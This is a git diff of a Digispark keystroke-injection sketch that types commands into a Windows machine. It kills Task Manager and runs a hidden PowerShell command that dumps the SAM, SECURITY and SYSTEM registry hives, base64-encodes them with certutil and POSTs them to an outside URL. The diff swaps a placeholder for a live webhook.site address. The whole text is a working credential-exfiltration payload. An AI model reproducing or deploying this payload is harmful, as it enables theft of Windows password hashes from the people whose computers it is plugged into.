@@ -24,7 +24,7 @@ void loop() {
   DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
   DigiKeyboard.println("cd $env:temp"); //going to temporary dir
   DigiKeyboard.delay(300);  
-  DigiKeyboard.println(F("PowerShell.exe -windowstyle hidden {reg save HKLM\\SAM SA.B; certutil -encode -f SA.B SA.B; reg save HKLM\\security SE.B; certutil -encode -f SE.B SE.B; reg save HKLM\\system SY.B; certutil -encode -f SY.B SY.B;$U='<change this >';Invoke-WebRequest -Uri $U -Method POST -Infile SA.B;Invoke-WebRequest -Uri $U -Method POST -Infile SE.B;Invoke-WebRequest -Uri $U -Method POST -Infile SY.B;del *.B;exit}")); //This is where all the magic happens
+  DigiKeyboard.println(F("PowerShell.exe -windowstyle hidden {reg save HKLM\\SAM SA.B; certutil -encode -f SA.B SA.B; reg save HKLM\\security SE.B; certutil -encode -f SE.B SE.B; reg save HKLM\\system SY.B; certutil -encode -f SY.B SY.B;$U='https://webhook.site/b3d2af1d-3f86-4d09-a45d-98cb94b43b3d';Invoke-WebRequest -Uri $U -Method POST -Infile SA.B;Invoke-WebRequest -Uri $U -Method POST -Infile SE.B;Invoke-WebRequest -Uri $U -Method POST -Infile SY.B;del *.B;exit}")); //This is where all the magic happens
   DigiKeyboard.delay(200);  
   digitalWrite(1, HIGH); //turn on led when program finishes
   DigiKeyboard.delay(90000);
